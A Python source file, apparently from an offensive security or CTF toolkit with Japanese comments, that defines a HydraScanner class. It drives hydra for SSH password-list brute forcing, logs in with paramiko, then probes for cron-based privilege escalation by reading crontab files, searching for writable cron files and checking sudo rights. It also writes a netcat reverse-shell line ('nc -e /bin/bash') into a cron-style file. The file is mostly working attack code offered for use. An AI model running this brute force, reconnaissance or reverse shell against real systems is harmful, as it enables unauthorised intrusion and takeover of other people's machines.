import asyncio
from typing import Dict, List, Optional
import re
import paramiko
import socket

class HydraScanner:
    """hydraを使用してブルートフォース攻撃を実行するスキャナー"""

    def __init__(self):
        # タイムアウトや並列実行数などのデフォルト設定
        self.timeout = 30
        self.tasks = 4

    async def _execute_ssh_command(self, ssh_client: paramiko.SSHClient, command: str, timeout: int = 10) -> str:
        """SSHクライアントでコマンドを実行し、結果を返します。"""
        try:
            stdin, stdout, stderr = ssh_client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            return output if output else error
        except Exception as e:
            return f"Error executing command '{command}': {str(e)}"

    async def _check_cron_privilege_escalation(self, ssh_client: paramiko.SSHClient) -> str:
        """cronジョブの権限昇格の可能性をチェックします。"""
        results = []
        results.append("🔍 CRON PRIVILEGE ESCALATION ANALYSIS")
        results.append("=" * 50)
        
        # 1. /etc/crontabの確認
        results.append("\n📋 1. Checking /etc/crontab:")
        crontab_content = await self._execute_ssh_command(ssh_client, "cat /etc/crontab")
        results.append(f"Content:\n{crontab_content}")
        
        # 2. ユーザーのcronジョブ確認
        results.append("\n📋 2. Checking user cron jobs:")
        user_cron = await self._execute_ssh_command(ssh_client, "crontab -l 2>/dev/null || echo 'No user cron jobs'")
        results.append(f"User cron jobs:\n{user_cron}")
        
        # 3. システム全体のcronジョブ確認
        results.append("\n📋 3. Checking system cron directories:")
        cron_dirs = ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.monthly", "/etc/cron.weekly"]
        for cron_dir in cron_dirs:
            dir_content = await self._execute_ssh_command(ssh_client, f"ls -la {cron_dir} 2>/dev/null || echo 'Directory not found'")
            results.append(f"\n{cron_dir}:\n{dir_content}")
        
        # 4. 実行可能なcronジョブの検索
        results.append("\n📋 4. Searching for writable cron jobs:")
        writable_cron = await self._execute_ssh_command(ssh_client, "find /etc/cron* -type f -writable 2>/dev/null || echo 'No writable cron files found'")
        results.append(f"Writable cron files:\n{writable_cron}")
        
        # 5. 権限昇格の可能性を分析
        results.append("\n📋 5. Privilege escalation analysis:")
        
        # 現在のユーザーとグループを確認
        current_user = await self._execute_ssh_command(ssh_client, "whoami")
        current_groups = await self._execute_ssh_command(ssh_client, "groups")
        results.append(f"Current user: {current_user}")
        results.append(f"Current groups: {current_groups}")
        
        # sudo権限の確認
        sudo_check = await self._execute_ssh_command(ssh_client, "sudo -l 2>/dev/null || echo 'No sudo access'")
        results.append(f"Sudo privileges:\n{sudo_check}")
        
        # 6. 権限昇格の試行
        results.append("\n📋 6. Attempting privilege escalation:")
        
        # 方法1: 既存のcronジョブに悪意のあるコマンドを追加
        if "No writable cron files found" not in writable_cron:
            results.append("⚠️ Found writable cron files - potential for privilege escalation!")
            
            # 例: リバースシェルの作成を試行
            reverse_shell_attempt = await self._execute_ssh_command(
                ssh_client, 
                "echo '*/1 * * * * nc -e /bin/bash 127.0.0.1 4444' >> /tmp/test_cron 2>/dev/null && echo 'Test cron entry created' || echo 'Failed to create test cron entry'"
            )
            results.append(f"Reverse shell attempt: {reverse_shell_attempt}")
        
        # 方法2: PATH環境変数の悪用
        path_check = await self._execute_ssh_command(ssh_client, "echo $PATH")
        results.append(f"Current PATH: {path_check}")
        
        # 方法3: 既存のスクリプトの上書き
        script_check = await self._execute_ssh_command(ssh_client, "find /etc/cron* -name '*.sh' -exec ls -la {} \\; 2>/dev/null || echo 'No cron scripts found'")
        results.append(f"Cron scripts:\n{script_check}")
        
        # 7. 推奨対策
        results.append("\n📋 7. Security recommendations:")
        results.append("• Ensure cron files have proper permissions (644 or 600)")
        results.append("• Regularly audit cron jobs for suspicious entries")
        results.append("• Use absolute paths in cron jobs")
        results.append("• Implement file integrity monitoring")
        results.append("• Restrict cron access to authorized users only")
        
        return "\n".join(results)

    async def ssh_login_test(self, target: str, username: str, password: str, port: int = 22) -> str:
        """指定のIDとPasswordを使用してSSHログインを試します。"""
        
        try:
            # SSHクライアントを作成
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # 接続タイムアウトを設定
            ssh_client.connect(
                hostname=target,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            # 接続が成功した場合、基本的な情報を取得
            try:
                # ホスト名を取得
                hostname = await self._execute_ssh_command(ssh_client, 'hostname')
                
                # 現在のユーザーを取得
                current_user = await self._execute_ssh_command(ssh_client, 'whoami')
                
                # システム情報を取得
                system_info = await self._execute_ssh_command(ssh_client, 'uname -a')
                
                # 基本情報の結果
                basic_info = f"""✅ SUCCESS: SSH login successful!

🔐 Login Details:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

📋 System Information:
  - Hostname: {hostname}
  - Current User: {current_user}
  - System: {system_info}

💡 The credentials are valid and you can now execute commands on the target system."""
                
                # cron権限昇格の分析を実行
                cron_analysis = await self._check_cron_privilege_escalation(ssh_client)
                
                ssh_client.close()
                
                return f"{basic_info}\n\n{cron_analysis}"
                
            except Exception as e:
                ssh_client.close()
                return f"""✅ SUCCESS: SSH login successful!

🔐 Login Details:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

⚠️ Note: Login successful but could not retrieve system information.
Error: {str(e)}"""
                
        except paramiko.AuthenticationException:
            return f"""❌ FAILED: Authentication failed

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

💡 The username or password is incorrect."""
            
        except paramiko.SSHException as e:
            return f"""❌ FAILED: SSH connection error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🔧 Error: {str(e)}"""
            
        except socket.timeout:
            return f"""❌ FAILED: Connection timeout

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

⏱️ The connection timed out after {self.timeout} seconds."""
            
        except socket.gaierror:
            return f"""❌ FAILED: Host not found

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🌐 The host '{target}' could not be resolved."""
            
        except Exception as e:
            return f"""❌ FAILED: Unexpected error

🔐 Login Attempt:
  - Host: {target}:{port}
  - Username: {username}
  - Password: {password}

🚨 Error: {str(e)}"""

    async def ssh_brute_force(self, target: str, port: int, username: str, password_list_path: str) -> str:
        """SSHに対してパスワードリスト攻撃を実行します。"""

        # hydraコマンドを安全なリスト形式で構築
        cmd_parts = [
            "hydra",
            "-t", str(self.tasks),
            "-W", str(self.timeout),
            "-l", username,
            "-P", password_list_path,
            f"ssh://{target}:{port}"
        ]

        # サブプロセスとしてhydraコマンドを実行
        process = await asyncio.create_subprocess_exec(
            *cmd_parts,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()
        
        output = stdout.decode('utf-8', errors='ignore').strip()
        error_output = stderr.decode('utf-8', errors='ignore').strip()

        # hydraの出力を解析してパスワードを見つける
        # 例: [22][ssh] host: 10.10.13.152   login: lin   password: RedDr@gonSyn9ic47e
        password_pattern = re.compile(r'password:\s*(.*)')
        found_password = None
        
        for line in output.splitlines():
            if "host:" in line and "login:" in line and "password:" in line:
                match = password_pattern.search(line)
                if match:
                    found_password = match.group(1).strip()
                    break
        
        if found_password:
            return f"✅ SUCCESS: Password found!\n  - Host: {target}\n  - Port: {port}\n  - User: {username}\n  - Password: {found_password}"
        elif process.returncode != 0:
            return f"❌ FAILED: hydra command failed.\nError: {error_output or output}"
        else:
            return "❌ FAILED: Password not found in the provided list."

    async def get_status(self) -> str:
        """Hydra Scannerの状態確認"""
        # hydraがインストールされているか簡単なチェック
        process = await asyncio.create_subprocess_shell("hydra -h", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        await process.communicate()
        if process.returncode == 0:
            return "Available"
        else:
            return "Not available (hydra command not found)"